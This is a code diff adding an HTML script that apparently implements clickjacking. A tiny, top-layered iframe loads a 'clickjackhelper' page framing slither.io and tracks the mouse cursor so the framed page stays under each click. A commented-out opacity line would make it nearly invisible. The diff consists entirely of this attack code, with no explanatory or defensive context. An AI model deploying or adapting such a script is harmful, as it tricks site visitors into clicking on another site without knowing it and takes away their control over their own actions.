@@ -1,0 +1,43 @@
+        <script>
+                const helperSettings = {
+                        width:700,
+                        height:500,
+                        top:-370,
+                        left:-320,
+                        src: 'http://slither.io/'
+                }
+                const settings = {
+                        width:10,
+                        height:10
+                }
+                let iframe;
+                window.addEventListener('load',()=>{
+                        iframe = document.createElement('iframe');
+                        iframe.width = settings.width;
+                        iframe.height = settings.height;
+                        iframe.style.overflow = 'hidden';
+                        iframe.scrolling = 'no';
+                        iframe.style.top = 0 + 'px';
+                        iframe.style.left = 0 + 'px';
+                        iframe.style.position = 'absolute';
+                        iframe.style.zIndex = 999999;
+                        //iframe.style.opacity = 0.001;
+                        iframe.src = 'clickjackhelper.html?AXBC' + JSON.stringify(helperSettings);
+			iframe.addEventListener('click',(e)=>{
+				let target = e.target;
+				target.style['pointer-events'] = 'none';
+				setTimeout(()=>{
+					target.style['pointer-events'] = 'auto';
+				},1000*15);
+			});
+                        document.body.appendChild(iframe);
+                });
+                window.addEventListener('mousemove',e=>{
+                        let x = e.pageX;
+                        let y = e.pageY;
+                        iframe.style.left = x - 2 + 'px';
+                        iframe.style.top = y - 2 + 'px';
+
+                });
+
+        </script>
